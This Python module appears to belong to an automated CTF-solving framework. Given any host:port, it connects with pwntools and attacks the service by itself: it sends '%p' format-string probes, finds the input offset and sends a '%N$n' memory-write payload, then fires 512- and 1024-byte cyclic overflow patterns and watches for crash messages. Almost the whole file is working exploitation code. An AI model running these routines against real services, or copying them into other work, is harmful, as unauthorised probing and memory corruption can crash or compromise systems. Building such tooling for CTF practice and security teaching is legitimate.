"""
Enhanced pwntools-based netcat for remote exploitation.

Uses pwntools remote() for better interaction than raw sockets.
Handles common CTF remote exploitation patterns:

- Format string exploitation: detect %p responses, try %n writes
- Simple buffer overflows on remote: send cyclic pattern, detect crash feedback
- Banner grabbing with pwntools tubes API

Targets can be specified as:
  - host:port
  - nc host port
  - host port

Requires pwntools to be installed.
"""

import os
from typing import Any, Generator

import regex as re
from flagr.unit import NotApplicable
from flagr.unit import Unit as BaseUnit


# Patterns to parse host:port from target data
COLON_PATTERN = re.compile(rb"(\S+):(\d{1,5})\b")
HOST_PORT_PATTERN = re.compile(
    rb"(?:nc\s+)?(\S+)\s+(\d{1,5})",
    re.MULTILINE,
)


class Unit(BaseUnit):

    GROUPS = ["network", "pwn", "remote", "pwntools"]
    PRIORITY = 35
    RECURSE_SELF = False
    NO_RECURSE = True

    def __init__(self, *args, **kwargs):
        super(Unit, self).__init__(*args, **kwargs)

        # Require pwntools
        try:
            from pwn import remote, cyclic, context
        except ImportError:
            raise NotApplicable("pwntools not installed")

        # Don't apply to files or URLs
        if self.target.is_url or self.target.path:
            raise NotApplicable("not a network target")

        # Parse host:port from target data
        data = self.target.raw
        if isinstance(data, str):
            data = data.encode()

        # Try "host:port" format first
        colon_match = COLON_PATTERN.search(data)
        if colon_match:
            self._host = colon_match.group(1).decode()
            self._port = int(colon_match.group(2))
        else:
            # Try "nc host port" or "host port" format
            match = HOST_PORT_PATTERN.search(data)
            if not match:
                raise NotApplicable("no host:port found")
            self._host = match.group(1).decode()
            self._port = int(match.group(2))

        if self._port < 1 or self._port > 65535:
            raise NotApplicable("invalid port")

    def enumerate(self) -> Generator[Any, None, None]:
        """Yield exploitation strategies to try."""
        yield "format_string"
        yield "buffer_overflow"

    def _connect(self):
        """Create and return a pwntools remote connection."""
        os.environ["PWNLIB_NOTERM"] = "1"
        from pwn import remote, context

        context.log_level = "error"
        return remote(self._host, self._port, timeout=10)

    def evaluate(self, case: Any):
        """Connect and attempt exploitation based on strategy."""
        try:
            if case == "format_string":
                self._format_string_exploit()
            elif case == "buffer_overflow":
                self._buffer_overflow_probe()
        except Exception:
            pass

    def _format_string_exploit(self):
        """
        Detect and exploit format string vulnerabilities over the network.

        1. Send %p probes and check for pointer leaks.
        2. If leaks detected, try to find input offset.
        3. Attempt %n write if offset is found.
        """
        os.environ["PWNLIB_NOTERM"] = "1"
        from pwn import remote, context

        context.log_level = "error"

        # Phase 1: Probe with %p to detect format string vuln
        try:
            r = self._connect()
        except Exception:
            return

        try:
            # Receive banner
            try:
                banner = r.recvuntil(b"\n", timeout=3)
                if banner:
                    self.manager.register_data(self, banner)
            except Exception:
                banner = b""

            # Send format string probe
            probe = b"AAAA" + b".%p" * 20
            r.sendline(probe)

            try:
                response = r.recvall(timeout=5)
            except Exception:
                response = b""

            if not response:
                r.close()
                return

            self.manager.register_data(self, response)
            response_str = response.decode("utf-8", errors="replace")

            # Check for pointer leaks (0x7fff..., 0x5555..., etc.)
            pointers = re.findall(r"0x[0-9a-fA-F]{2,16}", response_str)

            if len(pointers) < 2:
                r.close()
                return

            # Format string vulnerability confirmed
            lines = [
                "=== Remote Format String Detected ===",
                f"  Target: {self._host}:{self._port}",
                f"  Leaked {len(pointers)} values:",
            ]
            for i, ptr in enumerate(pointers[:10]):
                lines.append(f"    %{i+1}$p = {ptr}")

            # Phase 2: Find offset where our input appears
            input_offset = None
            for i, ptr in enumerate(pointers):
                if "41414141" in ptr:
                    input_offset = i + 1
                    lines.append(
                        f"  [!] Input found at offset {input_offset} "
                        f"(%{input_offset}$n for write)"
                    )
                    break

            result = "\n".join(lines)
            self.manager.register_data(self, result)
            r.close()

            # Phase 3: If we found the offset, try a %n write exploit
            if input_offset is not None:
                self._try_format_write(input_offset)

        except Exception:
            try:
                r.close()
            except Exception:
                pass

    def _try_format_write(self, offset):
        """
        Attempt a format string write using the discovered offset.
        Sends a crafted %n payload and captures any resulting output.
        """
        os.environ["PWNLIB_NOTERM"] = "1"
        from pwn import context

        context.log_level = "error"

        try:
            r = self._connect()
        except Exception:
            return

        try:
            # Receive and discard banner
            try:
                r.recv(timeout=3)
            except Exception:
                pass

            # Build a simple %n write payload
            # Write a small value to see if it triggers anything
            payload = b"%" + str(offset).encode() + b"$n"
            r.sendline(payload)

            try:
                response = r.recvall(timeout=5)
            except Exception:
                response = b""

            if response:
                self.manager.register_data(self, response)
        except Exception:
            pass
        finally:
            try:
                r.close()
            except Exception:
                pass

    def _buffer_overflow_probe(self):
        """
        Send a cyclic pattern over the network and detect crash feedback.

        Many CTF services echo back crash information or change behavior
        when a buffer overflow occurs.
        """
        os.environ["PWNLIB_NOTERM"] = "1"
        from pwn import cyclic, context

        context.log_level = "error"

        try:
            r = self._connect()
        except Exception:
            return

        try:
            # Receive banner
            try:
                banner = r.recvuntil(b"\n", timeout=3)
                if banner:
                    self.manager.register_data(self, banner)
            except Exception:
                banner = b""

            # Send cyclic pattern to trigger overflow
            pattern = cyclic(512)
            r.sendline(pattern)

            try:
                response = r.recvall(timeout=5)
            except Exception:
                response = b""

            if not response:
                r.close()
                # Try with a larger pattern on a new connection
                try:
                    r = self._connect()
                except Exception:
                    return

                try:
                    r.recv(timeout=3)
                except Exception:
                    pass

                pattern = cyclic(1024)
                r.sendline(pattern)

                try:
                    response = r.recvall(timeout=5)
                except Exception:
                    response = b""

            if response:
                self.manager.register_data(self, response)

                # Check for crash indicators in response
                response_str = response.decode("utf-8", errors="replace").lower()
                crash_indicators = [
                    "segfault", "sigsegv", "segmentation fault",
                    "stack smashing", "buffer overflow",
                    "core dumped", "abort",
                ]
                for indicator in crash_indicators:
                    if indicator in response_str:
                        result = (
                            f"=== Remote Buffer Overflow Detected ===\n"
                            f"  Target: {self._host}:{self._port}\n"
                            f"  Indicator: {indicator}\n"
                            f"  Pattern length: {len(pattern)} bytes"
                        )
                        self.manager.register_data(self, result)
                        break
        except Exception:
            pass
        finally:
            try:
                r.close()
            except Exception:
                pass
